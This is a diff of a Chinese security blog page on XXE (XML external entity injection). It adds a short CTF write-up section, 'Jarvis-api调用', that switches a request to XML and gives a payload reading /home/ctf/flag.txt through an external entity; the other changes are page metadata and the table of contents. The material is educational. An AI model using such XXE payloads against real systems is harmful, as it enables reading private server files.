@@ -128,7 +128,7 @@
 <meta property="og:description" content="概览 XXE(XML External Entity Injection)全称为XML外部实体注入.在解析外部实体的过程中,XML解析器可以根据URL中指定的方案(协议)来查询各种网络协议和服务(DNS,FTP,HTTP,SMB等),攻击者可以通过构造恶意输入达成目的. PHP中有XXE漏洞的标志性函数为simplexml_load_string(),会解析外部实体. XML XML(可扩">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://hitworld.github.io/png/2021-01-10-15-20-36.png">
-<meta property="og:updated_time" content="2021-07-03T05:40:11.581Z">
+<meta property="og:updated_time" content="2021-07-03T07:10:42.058Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IS-web-XXE-基础">
 <meta name="twitter:description" content="概览 XXE(XML External Entity Injection)全称为XML外部实体注入.在解析外部实体的过程中,XML解析器可以根据URL中指定的方案(协议)来查询各种网络协议和服务(DNS,FTP,HTTP,SMB等),攻击者可以通过构造恶意输入达成目的. PHP中有XXE漏洞的标志性函数为simplexml_load_string(),会解析外部实体. XML XML(可扩">
@@ -505,7 +505,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">3.1k</span>
+                <span title="本文字数">3.3k</span>
               
 
               
@@ -578,6 +578,9 @@
 <li><code>Java</code>:<code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false);</code>.</li>
 </ul>
 <p>禁用关键字:<code>SYSTEM</code>,<code>DOCTYPE</code>,<code>ENTITY</code>.</p>
+<h2 id="jarvis-api调用">Jarvis-api调用</h2>
+<p>右键发现是利用<code>ajax</code>发送<code>json</code>数据,<code>Content-Type</code>改为<code>application/xml</code>,<code>xxe</code>即可.</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE file [&lt;!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">file</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -700,7 +703,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">155</span>
+                    <span class="site-state-item-count">121</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -830,7 +833,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">36</span>
+                      
+                    
+                    <span class="site-state-item-count">37</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
@@ -880,7 +885,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#概览"><span class="nav-number">1.</span> <span class="nav-text">概览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xml"><span class="nav-number">2.</span> <span class="nav-text">XML</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cdata"><span class="nav-number">3.1.</span> <span class="nav-text">CDATA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据发送"><span class="nav-number">3.2.</span> <span class="nav-text">数据发送</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程代码执行"><span class="nav-number">3.3.</span> <span class="nav-text">远程代码执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御"><span class="nav-number">4.</span> <span class="nav-text">防御</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#概览"><span class="nav-number">1.</span> <span class="nav-text">概览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xml"><span class="nav-number">2.</span> <span class="nav-text">XML</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cdata"><span class="nav-number">3.1.</span> <span class="nav-text">CDATA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据发送"><span class="nav-number">3.2.</span> <span class="nav-text">数据发送</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程代码执行"><span class="nav-number">3.3.</span> <span class="nav-text">远程代码执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御"><span class="nav-number">4.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvis-api调用"><span class="nav-number">5.</span> <span class="nav-text">Jarvis-api调用</span></a></li></ol></div>
             
 
           </div>
@@ -912,7 +917,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">898k</span>
+    <span title="站点总字数">807k</span>
   
 
   
@@ -921,7 +926,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">13:36</span>
+    <span title="站点阅读时长">12:13</span>
   
 </div>
 
